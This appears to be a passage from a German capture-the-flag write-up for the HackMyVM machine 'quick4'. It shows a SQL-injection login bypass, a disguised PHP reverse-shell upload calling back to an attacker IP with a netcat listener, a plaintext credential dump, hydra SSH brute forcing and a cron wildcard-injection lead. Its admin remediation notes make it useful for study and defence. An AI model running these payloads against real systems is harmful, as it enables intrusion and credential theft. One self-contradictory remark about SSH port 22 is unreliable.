+ <img src="uploads/2_admin.png" ... > <!-- Hinweis auf Pfad und Naming Convention -->
+ <!-- ... -->
+ Nick Greenhorn <!-- Hinweis auf User ID 2 -->
+ <!-- ... -->
+ <a href="logout.php" ... >Logout</a>
+ <!-- ... -->
+
+ # Versuchter Zugriff auf Webshell (1)
+ http://192.168.2.125/employee/uploads/2_shell.php?cmd=id
+ --> PAGE NOT FOUND
+                     </pre> <!-- Maskierung < > ? & -->
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Es werden weitere Versuche unternommen, auf die hochgeladene Webshell zuzugreifen.
+                1.  `curl http://192.168.2.125/employee/uploads/2_revshell.jpeg`: Greift auf die Datei mit der `.jpeg`-Endung zu. Die Ausgabe zeigt den PHP-Code, beginnend mit `GIF89a`.
+                2.  `curl http://192.168.2.125/employee/uploads/2_revshell.jpeg.php`: Greift auf die Datei mit einer **doppelten Endung** `.jpeg.php` zu.
+                3.  Ein Netcat-Listener wird auf Port 4445 gestartet. Nach dem Aufruf der `.jpeg.php`-URL (implizit) wird eine Verbindung empfangen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Erfolg durch doppelte Endung! Der Server interpretiert `.jpeg.php` als PHP-Datei und führt den Code aus. Der `curl`-Befehl auf die `.jpeg`-Datei bestätigt, dass der PHP-Code korrekt hochgeladen wurde. Die Reverse Shell wird erfolgreich zum Listener aufgebaut. **RCE als `www-data` ist etabliert.**
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Stabilisiere die Shell (`/bin/sh` erhalten). Beginne mit der Enumeration als `www-data`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> **Upload-Mechanismus dringend fixen!** Insbesondere die Handhabung von Dateiendungen und die Serverkonfiguration (z.B. `AddHandler`-Direktiven in Apache), die die Ausführung von `.jpeg.php` erlaubt, müssen korrigiert werden.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿cyber)-[~]
+ └─# <span class="command">curl http://192.168.2.125/employee/uploads/2_revshell.jpeg</span>
+                     </div>
+                     <pre>
+ GIF89a
+ <?php
+ $VERSION = "1.0";
+ $ip = '192.168.2.199';  // CHANGE THIS
+ $port = 4445;       // CHANGE THIS
+ $chunk_size = 1400;
+ $write_a = null;
+ $error_a = null;
+ $shell = 'uname -a; w; id; /bin/sh -i';
+ $daemon = 0;
+ $debug = 0;
+
+ //
+ // Daemonise ourself if possible to avoid zombies later
+ //
+
+ // ... (Rest des PHP-Codes) ...
+
+ ?>
+                     </pre> <!-- Maskierung < > ? -->
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿cyber)-[~]
+ └─# <span class="command">curl http://192.168.2.125/employee/uploads/2_revshell.jpeg.php</span>
+                     </div>
+                     <pre>
+ # (Keine direkte Ausgabe, löst aber die Reverse Shell aus)
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿cyber)-[~]
+ └─# <span class="command">nc -lvnp 4445</span>
+                     </div>
+                     <pre>
+ listening on [any] 4445 ...
+ connect to [192.168.2.199] from (UNKNWN) [192.168.2.125] 36270
+ Linux quick4 5.15.0-92-generic #102-Ubuntu SMP Wed Jan 10 09:33:48 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
+  22:39:33 up  1:40,  0 users,  load average: 0.07, 0.09, 0.44
+ USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+ uid=33(www-data) gid=33(www-data) groups=33(www-data)
+ /bin/sh: 0: can't access tty; job control turned off
+ $
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+       <section id="poc-initial-access">
+            <h2>Proof of Concept (Initial Access - RCE via Upload)</h2>
+             <p class="analysis">
+                 <strong>Analyse:</strong> Dieser POC fasst die Schritte zur Erlangung von Remote Code Execution als `www-data` über SQL-Injection und eine unsichere Dateiupload-Funktion zusammen.
+             </p>
+             <p>
+                 <strong>Schwachstellen:</strong>
+                 <ol>
+                     <li>SQL-Injection im Login des Mitarbeiterbereichs (`/employee/admin.php`).</li>
+                     <li>Unsicherer Dateiupload im Mitarbeiterbereich (`/employee/manageemployees.php`), der das Hochladen von PHP-Code (getarnt als Bild mit manipuliertem Content-Type und Magic Bytes) erlaubt.</li>
+                     <li>Fehlerhafte Umbenennung/Validierung, die die Ausführung von Dateien mit doppelter Endung (z.B. `.jpeg.php`) ermöglicht.</li>
+                 </ol>
+             </p>
+             <p>
+                 <strong>Voraussetzungen:</strong> Webzugriff auf Port 80. Kenntnis der Mitarbeiter-Login-Seite (`/employee/admin.php`).
+             </p>
+             <p>
+                 <strong>Schritte zur Reproduktion:</strong>
+                 <ol>
+                     <li>Umgehe den Login zu `/employee/admin.php` mittels SQL-Injection (z.B. E-Mail: `info@quick.hmv`, Passwort: `' OR 1=1 -- -`).</li>
+                     <li>Navigiere zur Funktion zum Verwalten/Bearbeiten von Mitarbeitern (z.B. `/employee/manageemployees.php`).</li>
+                     <li>Identifiziere die Funktion zum Hochladen von Profilbildern.</li>
+                     <li>Erstelle eine PHP-Reverse-Shell-Datei (z.B. `rev.php`). Füge `GIF89a` am Anfang der Datei ein.</li>
+                     <li>Fange die Upload-Anfrage mit einem Proxy (z.B. Burp Suite) ab.</li>
+                     <li>Modifiziere die Anfrage: Setze `filename` auf `rev.php`, `Content-Type` auf `image/jpeg` und füge den Inhalt der modifizierten `rev.php` ein. Sende die Anfrage ab.</li>
+                     <li>Ermittle den Pfad und den finalen Namen der hochgeladenen Datei (z.B. durch Analyse des HTML oder Ausprobieren von Schemata wie `/employee/uploads/{user_id}_rev.jpeg.php`). Hier war es `/employee/uploads/2_revshell.jpeg.php`.</li>
+                     <li>Starte einen Netcat-Listener auf dem Angreifer-System (z.B. `nc -lvnp 4445`).</li>
+                     <li>Rufe die URL der hochgeladenen und ausführbaren Datei im Browser auf oder per `curl`.</li>
+                 </ol>
+             </p>
+             <p>
+                 <strong>Erwartetes Ergebnis:</strong> Eine Reverse Shell wird zum Listener aufgebaut, die als Benutzer `www-data` läuft.
+             </p>
+              <p class="recommendation">
+                 <strong>Empfehlung (Admin):</strong> Beheben Sie die SQL-Injection-Schwachstelle durch Verwendung von Prepared Statements. Implementieren Sie einen sicheren Dateiupload-Mechanismus (Whitelist, Inhaltsvalidierung, keine Ausführung im Upload-Ordner, zufällige Namen). Korrigieren Sie die Apache-Konfiguration bezüglich ausführbarer Endungen.
+             </p>
+         </section>
+
+        <section id="post-exploitation">
+            <h2>Post-Exploitation & Credential Discovery</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> In der `www-data`-Shell wird die Datei `/var/www/html/customer/config.php` ausgelesen. Anschließend wird versucht, sich als `root` mit `su` anzumelden (scheitert). Danach wird mit den gefundenen Credentials eine Verbindung zur lokalen MySQL-Datenbank aufgebaut, Datenbanken und Tabellen aufgelistet und der Inhalt der `users`-Tabelle ausgegeben.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> `config.php` enthält die MySQL-Credentials: Benutzer `root`, Passwort `<span class="password">fastandquicktobefaster</span>`. Dies ist ein kritischer Fund. Der Login zur Datenbank gelingt. Die `users`-Tabelle in der `quick`-Datenbank enthält eine Liste von Benutzern (Kunden, Mitarbeiter, Admins) mit ihren **Passwörtern im Klartext**. Dies ist eine extrem schwerwiegende Sicherheitslücke. Viele Benutzer (`nick.greenhorn`, `andrew.speed`, `benni`, `admin`) verwenden das gleiche schwache Passwort "benni".
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Dokumentiere alle gefundenen Credentials. Teste diese systematisch gegen SSH und andere gefundene Dienste/Logins. Das Passwort des Datenbank-`root`-Benutzers könnte auch das System-`root`-Passwort sein (testen!).
+                <br>
+                <strong>Empfehlung (Admin):</strong> **Ändern Sie sofort das MySQL-Root-Passwort!** **Hashen Sie alle Passwörter in der Datenbank** mit einem modernen, starken Algorithmus (z.B. bcrypt, Argon2) und Salt. **Speichern Sie niemals Datenbank-Credentials in Klartext** in Webdateien; verwenden Sie Umgebungsvariablen oder sicherere Konfigurationsmethoden. Sorgen Sie dafür, dass der Webserver-Benutzer (`www-data`) keine unnötigen Leserechte auf Konfigurationsdateien hat. Schulen Sie Benutzer bzgl. starker, einzigartiger Passwörter.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">
+www-data@quick4:/var/www/html/customer$ <span class="command">cat config.php</span>
+                    </div>
+                    <pre>
+<?php
+// config.php
+$conn = new mysqli('localhost', 'root', '<span class="password">fastandquicktobefaster</span>', 'quick');
+
+// Check connection
+if ($conn->connect_error) {
+	die("Connection failed: " . $conn->connect_error);
+}
+?>
+                    </pre> <!-- Maskierung < > ? -->
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">
+www-data@quick4:/var/www/html/customer$ <span class="command">su root</span>
+                    </div>
+                    <pre>
+Password: <span class="command"><!-- Versuch mit DB-Passwort (implizit) --></span>
+su: Authentication failure
+                    </pre>
+                </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ www-data@quick4:/var/www/html/customer$ <span class="command">mysql -u root -p</span>
+                     </div>
+                     <pre>
+ Enter password: <span class="command">fastandquicktobefaster</span>
+ Welcome to the MySQL monitor.  Commands end with ; or \g.
+ Your MySQL connection id is 504951
+ Server version: 8.0.36-0ubuntu0.22.04.1 (Ubuntu)
+
+ Copyright (c) 2000, 2024, racle and/or its affiliates.
+
+ racle is a registered trademark of racle Corporation and/or its
+ affiliates. ther names may be trademarks of their respective
+ owners.
+
+ Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+ mysql> <span class="command">show databases;</span>
+ +--------------------+
+ | Database           |
+ +--------------------+
+ | information_schema |
+ | mysql              |
+ | performance_schema |
+ | quick              |
+ | sys                |
+ +--------------------+
+ 5 rows in set (0.01 sec)
+
+ mysql> <span class="command">use quick;</span>
+ Database changed
+ mysql> <span class="command">show tables;</span>
+ +-----------------+
+ | Tables_in_quick |
+ +-----------------+
+ | cars            |
+ | users           |
+ +-----------------+
+ 2 rows in set (0.01 sec)
+
+ mysql> <span class="command">select * from users;</span>
+ +----+-----------------------------------+-----------------+--------------------+----------+-----------------------------+
+ | id | email                             | name            | password           | role     | profile_picture             |
+ +----+-----------------------------------+-----------------+--------------------+----------+-----------------------------+
+ |  1 | info@quick.hmv                    | Quick           | Qe62W064sgRTdxAEpr | admin    | uploads/1_admin.png         |
+ |  2 | nick.greenhorn@quick.hmv          | Nick Greenhorn  | <span class="password">benni</span>              | employee | uploads/2_revshell.jpeg.php |
+ |  3 | andrew.speed@quick.hmv            | Andrew Speed    | <span class="password">benni</span>              | employee | uploads/3_rev.php           |
+ |  4 | jack.black@email.hmv              | Jack Black      | 1Wd35lRnAKMGMEwcsX | customer |                             |
+ |  5 | mike.cooper@quick.hmv             | Mike Cooper     | Rh978db3URen64yaPP | employee | uploads/5_mike.jpg          |
+ |  6 | j.doe@email.hmv                   | John Doe        | 0i3a8KyWS2IcbmqF02 | customer |                             |
+ |  7 | jane_smith@email.hmv              | Jane Smith      | pL2a92Po2ykXytzX7y | customer |                             |
+ |  8 | frank@email.hmv                   | Frank Stein     | 155HseB7sQzIpE2dIG | customer |                             |
+ |  9 | fred.flinstone@email.hmv          | Fred Flinstone  | qM51130xeGHHxKZWqk | customer |                             |
+ | 10 | s.hutson@email.hmv                | Sandra Hutson   | sF217VruHNj6wbjofU | customer |                             |
+ | 11 | b.clintwood@email.hmv             | Bill Clintwood  | 2yLw53N0m08hFyBXx | customer |                             |
+ | 12 | j.bond@email.hmv                  | James Bond      | 7wS93MQPiVQUkqfQ5T | customer |                             |
+ | 13 | d.trumpet@email.hmv               | Donald Trumpet  | f64KBw7cGvu1BkVwcb | customer |                             |
+ | 14 | m.monroe@email.hmv                | Michelle Monroe | f64KBw7cGvu1BkVwcb | customer |                             |
+ | 15 | jeff.anderson@quick.hmv           | Jeff Anderson   | 5dX3g8hnKo7AFNHXTV | employee | uploads/15_jeff.jpg         |
+ | 16 | lee.ka-shingn@quick.hmv@quick.hmv | Lee Ka-shing    | am636X6Rh1u6S8WNr4 | employee | uploads/16_lee.jpg          |
+ | 17 | laura.johnson@email.hmv           | Laura Johnson   | 95T3mjV3gublmR7Z | customer |                             |
+ | 18 | coos.busters@quick.hmv            | Coos Busters    | f1CD3u3XVo0uXumGah | employee | uploads/18_coos.jpg         |
+ | 19 | n.down@email.hmv                  | Neil Down       | Lj9Wr562vqNuLlkTr0 | customer |                             |
+ | 20 | t.green@email.hmv                 | Teresa Green    | 7zQ19L0HhFsivH3zFi | customer |                             |
+ | 21 | k.ball@email.hmv                  | Krystal Ball    | k1TI68MmYu8uQHhfS1 | customer |                             |
+ | 22 | juan.mecanico@quick.hmv           | Juan Mecánico   | 5a34pXYDAUMZCoPrg | employee | uploads/22_juan.jpg         |
+ | 23 | john.smith@quick.hmv              | John Smith      | 5Wqio90BLd7i4oBMXJ | employee | uploads/23_john.jpg         |
+ | 24 | misty.cupp@email.hmv              | Misty Cupp      | c1P35bcdw0mF3ExJXG | customer |                             |
+ | 25 | lara.johnson@quick.hmv            | Lara Johnson    | 5Y7zypv8tl9N7TeCFp | employee | uploads/25_lara.jpg         |
+ | 26 | j.daniels@email.hmv               | James Daniels   | yF891teFhjhj0Rg7ds | customer |                             |
+ | 27 | dick_swett@email.hmv              | Dick Swett      | y6KA4378EbK0ePv5XN | customer |                             |
+ | 28 | a.lucky@email.hmv                 | Anna Lucky      | c1P35bcdw0mF3ExJXG | customer |                             |
+ | 29 | benni@hacker.de                   | benni           | <span class="password">benni</span>              | customer |                             |
+ | 30 | admin@quick.hmv                   | admin           | <span class="password">benni</span>              | customer |                             |
+ +----+-----------------------------------+-----------------+--------------------+----------+-----------------------------+
+ 30 rows in set (0.00 sec)
+
+ mysql> <span class="command">exit</span>
+ Bye
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Das `/home`-Verzeichnis wird aufgelistet, und die User-Flag-Datei (`user.txt`) wird angezeigt. Der Inhalt besteht aus ASCII-Art und der Flag.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die User-Flag `<span class="password">HMV{7920c4596aad1b9826721f4cf7ca3bf0}</span>` wird erfolgreich aus `/home/user.txt` gelesen. Die ASCII-Art ist ein nettes Gimmick. Es ist unklar, welchem Benutzer die Flag eigentlich gehört, da sie direkt in `/home` liegt, aber als `www-data` konnten wir sie lesen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> User-Flag dokumentieren. Konzentriere dich auf Privilege Escalation.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Speichern Sie Flags oder sensible Daten nicht direkt im `/home`-Verzeichnis mit unsicheren Berechtigungen. Ordnen Sie sie den jeweiligen Benutzerverzeichnissen zu und schützen Sie diese.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ www-data@quick4:/var/www/html/customer$ <span class="command">ls /home/</span>
+                     </div>
+                     <pre>
+ andrew	 coos  jeff  john  juan	 lara  lee  mike  nick  user.txt
+                     </pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ www-data@quick4:/var/www/html/customer$ <span class="command">cat /home/user.txt</span>
+                     </div>
+                     <pre>
+                                             ██████    █████  █████ █████   █████████  █████   ████    █████ █████
+                                           ██████ ███  ███ ███   █████████   ███    ███ ███
+                                          ███    ███ ███   ███  ███  ███       ███  ███       ███  ███ █
+                                         ███     ███ ███   ███  ███ ███          ███████        ███████████
+                                         ███   █████ ███   ███  ███ ███          ██████       ████
+                                         ███ ████  ███   ███  ███ ███     ███ ███ ███            ███
+                                          ████████ ████████   █████ █████████  █████ ████          █████
+
+                                                                      %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#
+                                                                  @@@:    .::.          :%@@@@@@@@@@@@@@@@@@@@@@@@@
+                                                                 @ @@                      :#@@@  @@@@@@@@@@@@@@@@@@
+                                                                 @                       @    %@  @% @@@@@@@@@@@@@@@@@
+                                                                @                         @     =   @ *@        @*@@@@@
+                                                               @             @@@@@@@@@@@@:      %     @ @        @.@@@@@
+                                                            - @                   :=%@@#      @       +@+@        @@@@@@@
+                                                           @ @                              =*=        @ @@ +#     @@@@@@@
+                                                         =@*-:      :@@          :#@@@@@@@#.            @@ @ @#    @*@@@@@@@@
+                                                =@@@@%:                                 :%@@@%      .%@@ : @@@      @@@@@@                 *@
+                         :@@@@@+             #%:                                             ...         =                  .                 @
+              =@@%              :@*                                        =@@@@*                                          @ @                  @
+     %@@  +@+@@        +@                                     *@@@@-                                     #                                       @
+@: .@ @-          @                                  :@@*     =@@                                                                    @@@@@        =
+@    @@@        @                                =%    @% @                                                                           @. @@@@       @
+*@. @@  @ @   *                                    = @.                                                                               @     @@@      @ @
+*@ @@@@@ @.  @                +             - :  @%  @                               :@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%          =    .@@@@  @@@ @@@@@@
+ @@@@@  * @                =                @   @ @  @ @                     @@@@@@@@ @@@@@@@@@@@.@@@@@@@@@@@@@@@@@@@@@@@@@      @   @=#@*@@ @@@     @
+   *  @@@+                +@@ @            @ % % @=@  @ =                 *@@@@@@@@@@@@@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=    %   @*@@ @@  @@@   %
+   .                                        @   @ @ @ @+-                @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@        %@@@@ @@  @ @ @
+   @@-# @   *@@@@@+       :@@@.              @@@@ @@@@*@                @@@@@      @@@@@@@@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+          @@=@ %@@  @
+@@@@@@@ *  @@@@@@@@@@@@@@@@@@@@=    .@+                                @@@@         %@@@@@@@@@@@@@@@@@@: @@@@@@@@@@@@@      @      @@:@@@@%= @@
+@*      @@@@@@@@@@ @.@@@@@@@@@@@@@@@@@@*      @@@*                     @@@@  @@@@@@   @@@@@@@@@@@@@@@@@@@@@@@@@@@@     @         :@@@@@ @@@   @
+   %@@= %@@*:  @  @@ @ @@ @@ @@@@@@@@@@@@@@  @@-%@@@  @                @@@@%=@@@@@@@    @=@@@@@@@@@@@@@@@@@@                 @@ @@@@@@@@@    @@
+      @@@@:@=@@@@@@@%@:@=   =   @@@ @@@@@@ :@@ @@@@@@@@ :=             @@@@  @@@+ @@@   @@@@@@@@@@@                    @*         @@@@@*@@@@@
+      -+@@@ #@:@@@@   -@@ @@ @@-@@@ :*@            =@@@@@%@:=#@@@@=     @@@:@ @@@@=@@   @@@@@@@@                 @@
+          =@   @@ #@ @@  : @@@@@@@@ @@@@@@%      *%@*           -@:  @@@@@ @ .*@ @ #@   @@@@@@@@@         @%
+              @@@.-:   @@ %  @@@@@@@@@@@@@ . @@ @@@@@@@@@@@@@@@@@%   @@@@@ @@@@@ @ @@   @@     +@   @
+                  @         :=@@@+        @   :#@@@@@@@@ @.         @@@@@@ @   @+@=@@  -@@
+                    @@@@@@@@ @@@#:              @@@@@@@#           @@@+@@@ =@@@@  @@   @@
+                     =@@@@@@@@@@@@@@@-@@@@@@@.         :*%@@@@@@@@@@@@ @@@@ @@@=@ @    @@
+                         @@@@@@@@@                             @@@@@@@@@@@@  @@=@@    @@
+                                                                @@@@@@@ @@@@        =@@
+                                                                -@@@@@@@ @@@@@    #@@@
+                                                                  @@@@@@@ @@@@@@@@@@@
+                                                                       -@@@ @@@@@@
+
+
+                                                        <span class="password">HMV{7920c4596aad1b9826721f4cf7ca3bf0}</span>
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> Die aus der MySQL-Datenbank gedumpten Passwörter werden (vermutlich lokal auf dem Angreifer-System) mit `awk` extrahiert und in `pass.txt` gespeichert. Die Benutzernamen der Mitarbeiter werden in `hack.txt` gespeichert. `hydra` wird verwendet, um einen Brute-Force-Angriff auf SSH (Port 22, was falsch ist, SSH läuft auf Port 22) mit den gesammelten Benutzernamen und Passwörtern durchzuführen.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Die Vorbereitung der Listen ist sinnvoll. Der Hydra-Angriff scheitert jedoch (`0 valid password found`). Dies liegt wahrscheinlich daran, dass entweder die Passwörter für SSH andere sind als die in der Datenbank gefundenen oder dass der falsche Port (22 statt 22) verwendet wurde oder die Passwort-Authentifizierung für SSH deaktiviert ist.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Überprüfe den SSH-Port (Port 22 ist korrekt laut nmap). Teste die Credentials manuell für einige Benutzer. Falls immer noch erfolglos, konzentriere dich auf andere Privesc-Methoden.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Erzwingen Sie unterschiedliche Passwörter für verschiedene Dienste (DB, System-Login). Verwenden Sie Key-basierte SSH-Authentifizierung und deaktivieren Sie Passwort-Logins.
+             </p>
+              <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">
+  ┌──(root㉿cyber)-[~]
+  └─# <span class="command">cat user.txt | awk '{print $9}' # Lokaler Befehl zum Extrahieren der Passwörter</span>
+                      </div>
+                      <pre>
+ |
+ |
+ benni
+ benni
+ 1Wd35lRnAKMGMEwcsX
+ Rh978db3URen64yaPP
+ 0i3a8KyWS2IcbmqF02
+ pL2a92Po2ykXytzX7y
+ 155HseB7sQzIpE2dIG
+ qM51130xeGHHxKZWqk
+ sF217VruHNj6wbjofU
+ 2yLw53N0m08hFyBXx
+ 7wS93MQPiVQUkqfQ5T
+ f64KBw7cGvu1BkVwcb
+ f64KBw7cGvu1BkVwcb
+ 5dX3g8hnKo7AFNHXTV
+ am636X6Rh1u6S8WNr4
+ 95T3mjV3gublmR7Z
+ f1CD3u3XVo0uXumGah
+ Lj9Wr562vqNuLlkTr0
+ 7zQ19L0HhFsivH3zFi
+ k1TI68MmYu8uQHhfS1
+ 5a34pXYDAUMZCoPrg
+ 5Wqio90BLd7i4oBMXJ
+ c1P35bcdw0mF3ExJXG
+ 5Y7zypv8tl9N7TeCFp
+ yF891teFhjhj0Rg7ds
+ y6KA4378EbK0ePv5XN
+ c1P35bcdw0mF3ExJXG
+ |
+ |
+                      </pre>
+                  </div>
+              </div>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿cyber)-[~]
+ └─# <span class="command">cat hack.txt # Lokaler Befehl, zeigt Benutzernamen</span>
+                     </div>
+                     <pre>
+ andrew
+ coos
+ jeff
+ john
+ juan
+ lara
+ lee
+ mike
+ nick
+                     </pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿cyber)-[~]
+ └─# <span class="command">cat user.txt | awk '{print $9}' >> pass.txt # Lokaler Befehl</span>
+                     </div>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿cyber)-[~]
+ └─# <span class="command">hydra -L hack.txt -P pass.txt ssh://192.168.2.125:22 -t 64</span> <!-- Port 22 ist korrekt -->
+                     </div>
+                     <pre>
+ Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these * ignore laws and ethics anyway).
+
+ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-12 00:46:02
+ [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+ [DATA] max 64 tasks per 1 server, overall 64 tasks, 288 login tries (l:9/p:32), ~5 tries per task
+ [DATA] attacking ssh://192.168.2.125:22/
+ 1 of 1 target completed, 0 valid password found
+ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-12 00:46:42
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation (Cronjob Wildcard Injection)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> In der `www-data`-Shell werden erneut SUID-Dateien gesucht, `sudo -l` versucht (scheitert), Netzwerkverbindungen geprüft (`ss`) und die Crontab (`/etc/crontab`) ausgelesen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die SUID-Suche und der `sudo`-Check liefern keine neuen Erkenntnisse. `ss` bestätigt die bekannten Listener (SSH, MySQL, Apache). Die Crontab enthält jedoch einen **kritischen Eintrag**: `*/1 * * * * root /usr/local/bin/backup.sh`. Ein Skript wird **jede Minute als root** ausgeführt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche sofort das Skript `/usr/local/bin/backup.sh` und dessen Berechtigungen. Wenn es Schwachstellen enthält (z.B. unsichere Pfade, Wildcards) oder für `www-data` schreibbar ist, ist dies ein sehr wahrscheinlicher Privesc-Vektor.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Überprüfen Sie alle systemweiten und Benutzer-Cronjobs sorgfältig. Stellen Sie sicher, dass als root ausgeführte Skripte sicher geschrieben sind (keine Wildcards in kritischen Befehlen, absolute Pfade verwenden), dem root gehören und nicht von anderen Benutzern beschreibbar sind. Führen Sie Cronjobs mit den geringstmöglichen Rechten aus.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ www-data@quick4:/home$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span>
+                     </div>
+                     <pre>
+       297    129 -rwsr-xr-x   1 root     root       131832 May 27  2023 /snap/snapd/19457/usr/lib/snapd/snap-confine
+       297    129 -rwsr-xr-x   1 root     root       131832 Nov 29 14:54 /snap/snapd/20671/usr/lib/snapd/snap-confine
+       # ... (viele Standard SUIDs, ähnlich wie bei Liceo, keine Bash) ...
+      13735     20 -rwsr-xr-x   1 root     root               18736 Feb 26  2022 /usr/libexec/polkit-agent-helper-1
+      1112    228 -rwsr-xr-x   1 root     root              232416 Apr  3  2023 /usr/bin/sudo
+       # ... (weitere Standard SUIDs) ...
+     38991    332 -rwsr-xr-x   1 root     root              338536 Jan  2 16:54 /usr/lib/openssh/ssh-keysign
+                     </pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ www-data@quick4:/home$ <span class="command">sudo -l</span>
+                     </div>
+                     <pre>
+ [sudo] password for www-data: <span class="command"><!-- Kein Passwort bekannt --></span>
+ sudo: a password is required
+                     </pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ www-data@quick4:/home$ <span class="command">ss -altpn</span>
+                     </div>
+                     <pre>
+ State     Recv-Q    Send-Q        Local Address:Port          Peer Address:Port    Process
+ LISTEN    0         4096          127.0.0.53%lo:53                 0.0.0.0:*
+ LISTEN    0         128                 0.0.0.0:22                 0.0.0.0:*
+ LISTEN    0         70                127.0.0.1:33060              0.0.0.0:*
+ LISTEN    0         151               127.0.0.1:3306               0.0.0.0:*
+ LISTEN    0         511                       *:80                       *:*
+ LISTEN    0         128                    [::]:22                    [::]:*
+                     </pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ www-data@quick4:/home$ <span class="command">cat /etc/crontab</span>
+                     </div>
+                     <pre>
+ # /etc/crontab: system-wide crontab
+ # Unlike any other crontab you don't have to run the `crontab'
+ # command to install the new version when you edit this file
+ # and files in /etc/cron.d. These files also have username fields,
+ # that none of the other crontabs do.
+
+ SHELL=/bin/sh
+ # You can also override PATH, but by default, newer versions inherit it from the environment
+ #PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+ # Example of job definition:
+ # .---------------- minute (0 - 59)
+ # |  .------------- hour (0 - 23)
+ # |  |  .---------- day of month (1 - 31)
+ # |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+ # |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+ # |  |  |  |  |
+ # *  *  *  *  * user-name command to be executed
+ <span style="color:red; font-weight:bold;">*/1 *	* * *   root    /usr/local/bin/backup.sh</span>
+ 17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+ 25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+ 47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+ 52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+ #
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Inhalt und die Berechtigungen des Cron-Skripts `/usr/local/bin/backup.sh` werden überprüft.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Skript wechselt nach `/var/www/html/` und führt `tar czf /var/backups/backup-website.tar.gz *` aus. Die Verwendung des Wildcards (`*`) in einem `tar`-Befehl, der als root ausgeführt wird, ist eine **klassische Wildcard-Injection-Schwachstelle**. Wenn ein Angreifer (wie `www-data`, der wahrscheinlich Schreibrechte in `/var/www/html/` hat) Dateien erstellt, deren Namen mit `--` beginnen, interpretiert `tar` diese als Optionen. Die Berechtigungen des Skripts selbst (`-rwxr--r--`) verhindern ein direktes Überschreiben durch `www-data`.
+            </p>
+            <p class="recommendation">
